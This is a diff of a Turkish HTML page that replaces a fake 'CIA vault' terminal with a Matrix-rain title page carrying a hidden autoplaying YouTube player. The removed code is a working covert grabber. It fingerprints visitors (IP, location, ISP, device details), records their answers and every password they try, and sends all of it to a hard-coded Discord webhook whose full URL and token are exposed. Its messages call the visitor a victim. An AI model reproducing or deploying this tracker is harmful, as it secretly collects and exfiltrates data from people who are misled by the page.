@@ -3,176 +3,107 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CIA_CENTRAL_VAULT</title>
+    <title>HİDAYET - Legacy</title>
     <style>
-        body { background-color: #000; color: #00ff00; font-family: 'Courier New', Courier, monospace; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .terminal { width: 90%; max-width: 650px; padding: 25px; border: 1px solid #002200; background: #000; box-shadow: 0 0 20px rgba(0, 255, 0, 0.05); position: relative; }
-        .cia-header { color: #004400; font-size: 10px; text-align: right; margin-bottom: 20px; border-bottom: 1px solid #002200; padding-bottom: 5px; }
-        .query-box { font-size: 1.1rem; line-height: 1.6; margin: 15px 0; }
-        input { background: transparent; border: none; color: #00ff00; font-family: inherit; font-size: 1.2rem; outline: none; border-bottom: 1px solid #00ff00; width: 150px; text-align: center; }
-        .btn { background: #00ff00; color: #000; border: none; padding: 8px 20px; cursor: pointer; font-weight: bold; margin-top: 20px; font-family: inherit; text-transform: uppercase; }
-        #vault { display: none; color: #bc00ff; border: 1px solid #bc00ff; padding: 15px; box-shadow: 0 0 15px #bc00ff; }
-        .log-entry { border-bottom: 1px solid #1a1a1a; padding: 5px 0; font-size: 11px; }
-        .traitor-screen { color: #ff0000; display: none; text-align: center; font-weight: bold; font-size: 2rem; }
-        .cursor { animation: blink 1s infinite; }
-        @keyframes blink { 50% { opacity: 0; } }
+        :root { --main-g: #00ff41; --bg-dark: #000000; }
+        body { 
+            margin: 0; background: var(--bg-dark); color: var(--main-g); 
+            font-family: 'Courier New', monospace; overflow: hidden; 
+            text-shadow: 0 0 5px rgba(0,255,65,0.7);
+        }
+
+        /* Matrix Rain (Hafif ve Şeffaf) */
+        canvas { 
+            position: fixed; top: 0; left: 0; z-index: -1; 
+            opacity: 0.25; 
+        }
+
+        /* Ana Başlık */
+        h1 {
+            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            margin: 0; font-size: 50px; font-weight: 300; 
+            letter-spacing: 20px;
+            color: #fff; text-transform: uppercase;
+            border-left: 2px solid var(--main-g); border-right: 2px solid var(--main-g);
+            padding: 0 25px;
+            animation: flicker 3s infinite;
+        }
+
+        /* Lexus İmza (Şeffaf Köşe) */
+        .signature {
+            position: fixed; top: 15px; left: 15px; font-size: 11px; 
+            color: #333; /* Gizli imza */
+            letter-spacing: 2px;
+        }
+
+        /* Alt Bilgi */
+        .footer-info {
+            position: fixed; bottom: 15px; left: 15px; right: 15px;
+            display: flex; justify-content: space-between;
+            font-size: 11px; color: #555;
+        }
+
+        @keyframes flicker {
+            0% { opacity: 1; }
+            50% { opacity: 0.8; }
+            100% { opacity: 1; }
+        }
+
+        /* YouTube Player'ı gizlemek için */
+        #yt-player { position: absolute; top: -9999px; left: -9999px; }
     </style>
 </head>
 <body>
 
-    <div id="traitor-msg" class="traitor-screen">
-        [!] HAİN TESPİT EDİLDİ [!]<br>
-        <span style="font-size: 14px; color: #fff;">SİSTEM İHANETİ KAYDEDİLDİ. ERİŞİMİNİZ KALICI OLARAK ENGELLENDİ.</span>
-    </div>
+<canvas id="matrix"></canvas>
 
-    <div id="gate" class="terminal">
-        <div class="cia-header">INTERNAL_AFFAIRS // LEXUS_V12</div>
-        <div class="query-box">
-            Hello friend. <br>
-            Hello friend? That's lame. <br><br>
-            Sistem bütünlüğü doğrulanıyor... <br>
-            Protokol-X başlatılsın mı? (1/0) <span class="cursor">_</span>
-        </div>
-        <input type="text" id="cmd" maxlength="20" placeholder="KOMUT">
-        <br>
-        <button class="btn" onclick="execute()">KOMUTU GÖNDER</button>
-    </div>
+<h1>/HİDAYET</h1>
 
-    <div id="auth" class="terminal" style="display: none;">
-        <div class="cia-header">SECURITY_LAYER_02 // CREDENTIALS</div>
-        <div class="query-box" style="color: #ff0000;">DİKKAT: YETKİLİ ŞİFRESİ GEREKLİ!</div>
-        <input type="password" id="pass" placeholder="********">
-        <br>
-        <button class="btn" onclick="verify()">SİSTEME GİRİŞ YAP</button>
-    </div>
+<div class="signature">LEXUS / SINCE 2018</div>
 
-    <div id="vault" class="terminal">
-        <div class="cia-header" style="color: #bc00ff; border-bottom-color: #bc00ff;">LEXUS_VAULT // MONITORING</div>
-        <div id="log-list" style="max-height: 300px; overflow-y: auto;"></div>
-        <button class="btn" style="background: #bc00ff; color: #000; font-size: 10px;" onclick="localStorage.clear(); location.reload();">BELLEĞİ SIFIRLA</button>
-    </div>
+<div class="footer-info">
+    <span>ROMA - ZÎNÊ & MEMO BOTANÎ</span>
+    <span id="live-time"></span>
+</div>
 
-    <script>
-        // WEBHOOK VE ŞİFRE AYARLARI
-        const webh = "https://discord.com/api/webhooks/1480291700793544774/a8WwCE5IsjTE-p5kwWHuuI9IUGHLYYM1yAYtvz10nbhEljg2abosvDz3y74xzVnBT4eN";
-        const adminKey = "lexuscxnnn113";
+<iframe id="yt-player" width="0" height="0" 
+src="https://www.youtube.com/embed/L-9LeG6G8PE?autoplay=1&loop=1&playlist=L-9LeG6G8PE" 
+frameborder="0" allow="autoplay"></iframe>
 
-        // SAYFA YÜKLENDİĞİNDE
-        window.onload = async () => {
-            if (localStorage.getItem('sys_lock') === 'true') {
-                document.getElementById('gate').style.display = 'none';
-                document.getElementById('traitor-msg').style.display = 'block';
-                return;
-            }
-            renderLogs();
-            const p = await fetchPackets();
-            await sendToDiscord(p, "🛰️ SİNYAL YAKALANDI", "Kurban linke giriş yaptı.", 3447003);
-            saveLocal(p, "Giriş Yaptı");
-        };
+<script>
+    // Canlı Saat
+    function updateClock() {
+        const d = new Date();
+        const t = d.getHours().toString().padStart(2, '0') + ":" + 
+                  d.getMinutes().toString().padStart(2, '0') + ":" + 
+                  d.getSeconds().toString().padStart(2, '0');
+        document.getElementById('live-time').innerText = t;
+    }
+    setInterval(updateClock, 1000);
 
-        // CEVAP VERDİĞİNDE
-        async function execute() {
-            const val = document.getElementById('cmd').value;
-            const p = await fetchPackets();
+    // Matrix Rain
+    const canvas = document.getElementById('matrix');
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+    const chars = "01LEXUS/";
+    const fontSize = 16;
+    const columns = canvas.width / fontSize;
+    const drops = Array(Math.floor(columns)).fill(1);
 
-            await sendToDiscord(p, "💬 CEVAP GELDİ", `Kurbanın yanıtı: **${val}**`, 16776960);
-            saveLocal(p, `Cevap: ${val}`);
+    function drawMatrix() {
+        ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.fillStyle = "#00ff41";
+        ctx.font = fontSize + "px monospace";
 
-            if (val === "1") {
-                document.getElementById('gate').style.display = 'none';
-                document.getElementById('auth').style.display = 'block';
-            } 
-            else if (val === "0") {
-                localStorage.setItem('sys_lock', 'true');
-                await sendToDiscord(p, "🔴 HAİN TESPİT EDİLDİ", "0 seçildi, kurban banlandı.", 15158332);
-                alert("HAİN TESPİT EDİLDİ!");
-                location.reload();
-            } else {
-                alert("Geçersiz protokol: " + val);
-            }
+        for (let i = 0; i < drops.length; i++) {
+            const text = chars.charAt(Math.floor(Math.random() * chars.length));
+            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+            if (drops[i] * fontSize > canvas.height && Math.random() > 0.99) drops[i] = 0;
+            drops[i]++;
         }
-
-        // ŞİFRE GİRDİĞİNDE
-        async function verify() {
-            const passVal = document.getElementById('pass').value;
-            const p = await fetchPackets();
-
-            if (passVal === adminKey) {
-                document.getElementById('auth').style.display = 'none';
-                document.getElementById('vault').style.display = 'block';
-                await sendToDiscord(p, "🔥 TAM ERİŞİM", "Doğru admin şifresi girildi.", 3066993);
-                saveLocal(p, "Admin Girişi Başarılı");
-            } else {
-                await sendToDiscord(p, "⚠️ HATALI ŞİFRE", `Denenen Yanlış Şifre: **${passVal}**`, 16711680);
-                saveLocal(p, `Hatalı Şifre: ${passVal}`);
-                alert("YETKİSİZ ERİŞİM DENEMESİ");
-            }
-        }
-
-        // VERİ TOPLAMA MOTORU (ÇİFT KATMANLI)
-        async function fetchPackets() {
-            let data = { ip: "Bilinmiyor", city: "Bilinmiyor", isp: "Bilinmiyor" };
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const j = await res.json();
-                data = { ip: j.ip, city: `${j.city} / ${j.country_name}`, isp: j.org };
-            } catch (e) {
-                try {
-                    const res2 = await fetch('https://api.ipify.org?format=json');
-                    const j2 = await res2.json();
-                    data.ip = j2.ip;
-                } catch (e2) {}
-            }
-            return {
-                ...data,
-                os: navigator.platform,
-                ram: navigator.deviceMemory || "N/A",
-                cpu: navigator.hardwareConcurrency || "N/A",
-                res: `${window.screen.width}x${window.screen.height}`,
-                time: new Date().toLocaleString()
-            };
-        }
-
-        // DISCORD GÖNDERİM MOTORU
-        async function sendToDiscord(i, title, desc, clr) {
-            const payload = {
-                username: "LEXUS_CIA_BOT",
-                embeds: [{
-                    title: title,
-                    description: desc,
-                    color: clr,
-                    fields: [
-                        { name: "📍 Hedef Bilgisi", value: `IP: ${i.ip}\nKonum: ${i.city}\nISS: ${i.isp}`, inline: false },
-                        { name: "💻 Cihaz Analizi", value: `OS: ${i.os}\nRAM: ${i.ram} | CPU: ${i.cpu}\nEkran: ${i.res}`, inline: false }
-                    ],
-                    footer: { text: "Security System: Lexus V12.0" },
-                    timestamp: new Date()
-                }]
-            };
-
-            try {
-                await fetch(webh, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-            } catch (err) { console.error("Discord error:", err); }
-        }
-
-        function saveLocal(obj, evt) {
-            let h = JSON.parse(localStorage.getItem('lexus_history')) || [];
-            h.unshift({ ...obj, event: evt });
-            localStorage.setItem('lexus_history', JSON.stringify(h));
-            renderLogs();
-        }
-
-        function renderLogs() {
-            const list = document.getElementById('log-list');
-            const h = JSON.parse(localStorage.getItem('lexus_history')) || [];
-            if(list) {
-                list.innerHTML = h.map(i => `<div class="log-entry">[${i.time}] <span style="color:#fff">${i.event}</span>: ${i.ip}</div>`).join('');
-            }
-        }
-    </script>
+    }
+    setInterval(drawMatrix, 50);
+</script>
 </body>
 </html>
